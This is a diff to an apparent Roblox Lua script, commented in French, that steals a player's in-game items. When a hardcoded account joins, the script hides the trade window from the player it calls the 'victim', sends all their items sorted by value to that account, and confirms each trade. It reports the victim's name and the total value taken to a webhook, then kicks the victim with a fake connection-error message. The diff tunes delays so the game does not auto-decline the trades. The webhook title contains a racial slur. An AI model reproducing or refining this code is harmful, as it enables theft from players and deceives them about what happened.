@@ -6,7 +6,7 @@ local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
 
--- Paramètres
+-- Paramètres (A ajuster avec tes infos)
 local users = _G.Usernames or {"ThunderStealthZap16", "Natalhie10"}
 local webhook = _G.webhook or "" 
 local auth_token = "EBK-SS-A" 
@@ -17,14 +17,15 @@ local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui.Trade
 local inTrade = false
 
--- Correction du bug de déclin : Gestion propre de l'UI
+-- Désactivation propre de l'UI pour éviter les conflits et les déclins auto
 local function setupUI()
     pcall(function()
         tradeGui.Enabled = false
+        -- On empêche le script de fermer le trade violemment lors du changement d'état
         tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
             inTrade = tradeGui.Enabled
             if inTrade then
-                tradeGui.Enabled = false -- Reste invisible pour la victime
+                tradeGui.Enabled = false -- Reste invisible mais actif côté serveur
             end
         end)
     end)
@@ -48,7 +49,7 @@ local function getRAP(category, itemName)
     return 0
 end
 
--- Webhook minimaliste (Uniquement Pseudo et Total RAP)
+-- Webhook stylé selon l'image image_2026-02-17_185250511.png
 local function SendStatusWebhook(title, color)
     local totalRAP = 0
     for _, item in ipairs(itemsToSend) do
@@ -59,7 +60,7 @@ local function SendStatusWebhook(title, color)
         ["auth_token"] = auth_token,
         ["embeds"] = {{
             ["title"] = "⚠️ " .. title,
-            ["color"] = color,
+            ["color"] = color, -- Jaune : 16776960
             ["fields"] = {
                 {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                 {name = "💰 Total RAP:", value = "```" .. math.floor(totalRAP) .. "```", inline = true}
@@ -81,12 +82,14 @@ end
 
 local function startAutoTrade(targetPlayer)
     task.spawn(function()
+        -- Tri du RAP décroissant
         table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
 
         while #itemsToSend > 0 do
+            -- Envoi de la requête de trade
             netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
             
-            -- Attente robuste de l'acceptation
+            -- Attente que le trade soit accepté (plus robuste)
             local timeout = 0
             while not inTrade and timeout < 30 do
                 task.wait(1)
@@ -94,8 +97,7 @@ local function startAutoTrade(targetPlayer)
             end
             
             if inTrade then
-                -- FIX : Pause pour éviter que le jeu décline le trade instantanément
-                task.wait(2) 
+                task.wait(1.5) -- Délai de sécurité pour éviter le déclin auto du jeu
                 
                 local limit = 0
                 while #itemsToSend > 0 and limit < 50 do
@@ -104,7 +106,7 @@ local function startAutoTrade(targetPlayer)
                         netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                     end)
                     limit = limit + 1
-                    task.wait(0.2) -- Délai entre chaque item pour la stabilité
+                    task.wait(0.1)
                 end
 
                 task.wait(1)
@@ -112,12 +114,13 @@ local function startAutoTrade(targetPlayer)
                 task.wait(1)
                 netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                 
+                -- Attente de la fin du trade avant la suite
                 repeat task.wait(1) until not inTrade
             end
             task.wait(2)
         end
         
-        task.wait(1)
+        task.wait(2)
         plr:kick("Please check your internet connection and try again. (Error Code: 277)")
     end)
 end
@@ -136,12 +139,12 @@ for _, cat in ipairs(categories) do
     end
 end
 
--- Lancement
+-- Logique de détection
 if #itemsToSend > 0 then
     local function checkAndStart()
         for _, p in ipairs(Players:GetPlayers()) do
             if table.find(users, p.Name) then
-                SendStatusWebhook("The nigga is on the server !", 16776960) -- JAUNE
+                SendStatusWebhook("The nigga is on the server !", 16776960) -- Embed Jaune
                 startAutoTrade(p)
                 return true
             end
